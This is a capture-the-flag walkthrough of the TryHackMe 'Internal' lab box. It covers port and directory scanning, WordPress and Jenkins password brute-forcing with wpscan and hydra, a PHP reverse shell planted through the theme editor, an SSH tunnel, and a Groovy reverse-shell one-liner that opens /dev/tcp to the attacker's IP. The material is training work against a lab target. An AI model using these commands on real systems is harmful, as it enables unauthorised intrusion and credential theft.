---
title: THM{Internal}
author: Anugrah SR
date: 2020-11-19 01:30:00 +0800
categories: [Boot2root,Tryhackme]
tags: [ tryhackme, nmap, wpscan, linux, ssh, rustscan, Gobuster, burp, jenkins, hydra]
math: true
image: ""
---
# Internal
## About The Room
*.*<br>
* Url: https://tryhackme.com/room/internal
* Creator: []()
* Difficulty: low

## Reconnaissance
### RustScan
```bash
rustscan -a 10.10.71.130 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/cyph3r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.71.130:22
Open 10.10.71.130:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 09:53 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
Initiating Ping Scan at 09:53
Scanning 10.10.71.130 [2 ports]
Completed Ping Scan at 09:53, 0.17s elapsed (1 total hosts)
Initiating Connect Scan at 09:53
Scanning internal.thm (10.10.71.130) [2 ports]
Discovered open port 80/tcp on 10.10.71.130
Discovered open port 22/tcp on 10.10.71.130
Completed Connect Scan at 09:53, 0.17s elapsed (2 total ports)
Initiating Service scan at 09:53
Scanning 2 services on internal.thm (10.10.71.130)
Completed Service scan at 09:53, 6.91s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.71.130.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 4.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
Nmap scan report for internal.thm (10.10.71.130)
Host is up, received syn-ack (0.17s latency).
Scanned at 2020-11-21 09:53:14 EST for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:53
Completed NSE at 09:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
```
* Discovered open port 80/tcp
* Discovered open port 22/tcp

### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u internal.thm -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/21 09:55:57 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]      
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]                                      

===============================================================
2020/11/21 10:02:17 Finished
===============================================================
```
### HTTP
![](https://imgur.com/EUICOBBl.png)

### WPScan
from the author of the post, we know one of the username is `admin`
```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt

..
[!] Valid Combinations Found:
 | Username: admin, Password: xxxxxxx
..
```
`http://internal.thm/blog/wp-login.php` let's try to login!

## Gaining Shell

go to theme editor and change `404.php` with your reverse_php shell.
more details check this [website](https://www.hackingarticles.in/wordpress-reverse-shell/)

visit `internal.thm/blog/wp-content/themes/twentyseventeen/404.php` to get connection to netcat

```bash
nc -lvnp 1234                                                                                   1 ⨯
listening on [any] 1234 ...
connect to [10.8.131.89] from (UNKNOWN) [10.10.71.130] 56408
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:53:38 up  1:03,  0 users,  load average: 0.04, 0.11, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
### Full TTYs

Before editing the file in vim we need to set oru TTY

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Inside the nc session Press CTRL+Z and add the following lines.

```bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
## Local Privilege escalation
```bash
www-data@internal:/$ cd home/
www-data@internal:/home$ ls
aubreanna
www-data@internal:/home$
```
we have a user name `aubreanna`! Let's try to find her ssh password with hydra. Got nothing!
opt directory have something interesting!
```bash
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:xxxxxxxxxxxxx
www-data@internal:/opt$ su aubreanna
Password:
aubreanna@internal:/opt$
```
### User flag
```bash
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{xxxxxxxxxxxxx}
```
```bash
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
## Privilege escalation
We can not access this site directly, let's use ssh tunnel
### SSH Tunnel
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.112.28
```
let's visit `127.0.0.1:8080`
### Jenkins
![](https://imgur.com/8ihisfrl.png)
### hydra
```bash
hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
...
8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-22 13:35:35
```
`http://127.0.0.1:8080/manage`

![](https://imgur.com/Nb0OMwbl.png)

To create a reverse shell on the system, we need to use Groovy script. Since it is basically Java, we can use a Java reverse shell from pentestmonkey.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.131.89/1235;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
I can then listen for a connection on port 1235 and successfully get a reverse shell.
![](https://imgur.com/OwQWfk5l.png)

There was a `note.txt` in `/`opt` directory
```bash
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:xxxxxxxxxxx
```
![](https://imgur.com/Ho48ftxl.png)

### Root Flag
```bash
root@internal:~# cat root.txt
THM{d0ck3r_xxxxxxxx}
```
